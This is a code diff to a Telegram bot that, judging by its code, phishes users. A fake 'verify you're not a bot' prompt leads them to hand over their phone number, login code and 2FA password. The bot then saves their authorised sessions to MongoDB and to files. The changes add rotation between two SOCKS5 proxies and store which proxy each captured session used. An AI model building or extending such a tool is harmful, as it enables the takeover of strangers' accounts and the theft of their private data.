@@ -18,11 +18,22 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 
+# Основная прокси (старая, для совместимости)
 PROXY_HOST = os.getenv("PROXY_HOST")
 PROXY_PORT = int(os.getenv("PROXY_PORT"))
 PROXY_USER = os.getenv("PROXY_USER")
 PROXY_PASS = os.getenv("PROXY_PASS")
-proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
+main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
+
+# Вторая прокси (новая)
+PROXY1_HOST = os.getenv("PROXY1_HOST")
+PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
+PROXY1_USER = os.getenv("PROXY1_USER")
+PROXY1_PASS = os.getenv("PROXY1_PASS")
+second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)
+
+# Список доступных прокси (первая - старая основная)
+proxy_list = [main_proxy, second_proxy]
 
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
@@ -39,6 +50,17 @@ user_code_buffers = {}
 
 os.makedirs("sessions", exist_ok=True)
 
+def get_proxy_for_phone(phone):
+    """Выбираем прокси для номера"""
+    # Для старых сессий - используем сохраненный proxy_index или 0 (основной прокси)
+    existing_session = sessions_col.find_one({"phone": phone})
+    if existing_session:
+        # Если у сессии нет proxy_index, считаем что она использует основную прокси (индекс 0)
+        return proxy_list[existing_session.get('proxy_index', 0)]
+    
+    # Для новых сессий - распределяем между прокси
+    return proxy_list[hash(phone) % len(proxy_list)]
+
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     keyboard = InlineKeyboardMarkup().add(
@@ -50,8 +72,6 @@ async def cmd_start(message: types.Message):
         "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
         reply_markup=keyboard
     )
-
-
 
 @dp.callback_query_handler(lambda c: c.data == 'auth_account')
 async def start_auth(callback_query: types.CallbackQuery):
@@ -74,7 +94,10 @@ async def handle_contact(message: types.Message):
     if not phone.startswith("+"):
         phone = "+" + phone
 
-    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
+    # Выбираем прокси для этого номера
+    selected_proxy = get_proxy_for_phone(phone)
+    
+    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
     await client.connect()
     user_clients[user_id] = client
     user_phones[user_id] = phone
@@ -87,7 +110,7 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id]['message_id'] = msg_id
         await message.answer("⌨️ Enter the code by pressing the buttons below:")
     except Exception as e:
-        await message.answer(f"❌ Errore nell'invio del codice: {e}")
+        await message.answer(f"❌ Error sending code: {e}")
         await client.disconnect()
         cleanup(user_id)
 
@@ -103,7 +126,7 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
-                                    text=text, reply_markup=keyboard, parse_mode='Markdown')
+                                  text=text, reply_markup=keyboard, parse_mode='Markdown')
     else:
         msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
         return msg.message_id
@@ -154,7 +177,22 @@ async def try_sign_in_code(user_id, code):
         if await client.is_user_authorized():
             me = await client.get_me()
             session_str = client.session.save()
-            sessions_col.update_one({"phone": phone}, {"$set": {"phone": phone, "session": session_str}}, upsert=True)
+            
+            # Определяем индекс прокси для сохранения
+            proxy_index = 0  # по умолчанию старая прокси
+            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
+                current_proxy = client._sender._proxy
+                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
+            
+            sessions_col.update_one(
+                {"phone": phone}, 
+                {"$set": {
+                    "phone": phone, 
+                    "session": session_str, 
+                    "proxy_index": proxy_index
+                }}, 
+                upsert=True
+            )
 
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
@@ -197,7 +235,23 @@ async def process_2fa(message: types.Message):
         await client.sign_in(password=password)
         if await client.is_user_authorized():
             session_str = client.session.save()
-            sessions_col.update_one({"phone": phone}, {"$set": {"phone": phone, "session": session_str}}, upsert=True)
+            
+            # Определяем индекс прокси для сохранения
+            proxy_index = 0  # по умолчанию старая прокси
+            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
+                current_proxy = client._sender._proxy
+                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
+            
+            sessions_col.update_one(
+                {"phone": phone}, 
+                {"$set": {
+                    "phone": phone, 
+                    "session": session_str, 
+                    "proxy_index": proxy_index
+                }}, 
+                upsert=True
+            )
+            
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
